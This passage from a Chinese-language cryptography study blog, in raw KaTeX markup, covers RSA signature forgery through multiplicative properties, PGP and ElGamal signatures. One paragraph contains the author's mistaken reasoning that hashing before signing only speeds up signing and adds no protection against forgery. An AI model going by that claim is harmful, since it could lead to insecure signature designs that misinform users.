</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s_1s_2=m_1^dm_2^d\ =(m_1m_2)^d\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.097216em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。</p><p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m_1m_2,s_1s_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>也是合法的签名。</p><p>我觉得这个说法挺奇怪的，我更倾向于说<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_1s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_1m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的合法签名。</p></li><li><p>假设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m,s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>是有效的签名</p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>m</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo separator="true">,</mo><msup><mi>s</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m^{-1},s^{-1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>也是有效的签名。和第一个伪造的证法类似，都用到了幂的性质。</p></li></ol><p>这两个伪造中我认为更有破坏性的是第一个，因为我们可以搜集大量明文和签名，记录下来，然后进行组合，从而发送我们需要的信息，并且通过验证。</p><p><s>可以应对这种伪造，我们可以对先对明文进行一层hash，再进行签名。</s></p><p>但是我比较疑惑，这种伪造发生在什么样得情况下。正常情况下，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m,s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>做为一个整体在传递过程中是被加密得，只有收信方，也就是有私钥的那个人才能进行解密，从而看到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span></span></span></span>。正常情况下中间人是看不到签名的。</p><p>那我们假设中间人破解了加密，获得了签名，那这时它肯定也知道了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>。因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m,s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>是做为一个整体被加密的，你一旦看到了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span></span></span></span>，就说明你进行了解密，这时候<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>对你来说不是唾手可得嘛？那对签名进行强化，即对密文的哈希进行签名还有什么用呢？</p><p>我认为这么做唯一的好处就是可以让生成签名的时候更加快速，因为哈希之后的明文的长度将大大减小，这时候再进行RSA的指数运算，就会快得多了。</p><h3 id="pgp"><a class="markdownIt-Anchor" href="#pgp"></a> PGP</h3><p>PGP<code>Pretty Good Privacy</code>是最著名的保密电子邮件软件系统。该系统中就用到了RSA数字签名。</p><p><img src="https://upyun.wuuconix.link/image-20211019165120112.png" alt="PGP" /></p><p>考试前把流程都背下来，非常有可能让你写。</p><h3 id="elgamal签名密钥生成"><a class="markdownIt-Anchor" href="#elgamal签名密钥生成"></a> Elgamal签名密钥生成</h3><p>和Elgamal密码类似，密钥生成过程是一样的。</p><p><img src="https://upyun.wuuconix.link/image-20211021133056386.png" alt="elgamal 签名密钥生成" /></p><p>但是签名和验证的部分和加密解密有所区别。</p><h3 id="elgamal签名-签名"><a class="markdownIt-Anchor" href="#elgamal签名-签名"></a> Elgamal签名 签名</h3><ol><li>选择随机数k，k需要和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>互素。</li><li>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=g^k(mod \ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></li><li>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mi>a</mi><mi>x</mi><mo stretchy="false">)</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=(m-ax)k^{-1}(mod\ p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li><li>签名：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>I</mi><msub><mi>G</mi><mrow><mi>a</mi><mo separator="true">,</mo><mi>k</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">SIG_{a,k}=(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></li></ol><p>和加密过程一样，签名过程会产生出两个值，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>，在加密过程中那两个数叫做<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">c_1,c_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">c_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>一致。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">c_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>不同。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><msup><mi>β</mi><mi>k</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_2=m\beta^k\ mod(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><h3 id="elgamal签名-验证"><a class="markdownIt-Anchor" href="#elgamal签名-验证"></a> Elgamal签名 验证</h3><ol><li>收到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m,x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></li><li>则去计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>g</mi><mi>m</mi></msup><mi mathvariant="normal">与</mi></mrow><annotation encoding="application/x-tex">g^m与</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">与</span></span></span></span><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>β</mi><mi>x</mi></msup><msup><mi>x</mi><mi>y</mi></msup></mrow><annotation encoding="application/x-tex">\beta^xx^y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span 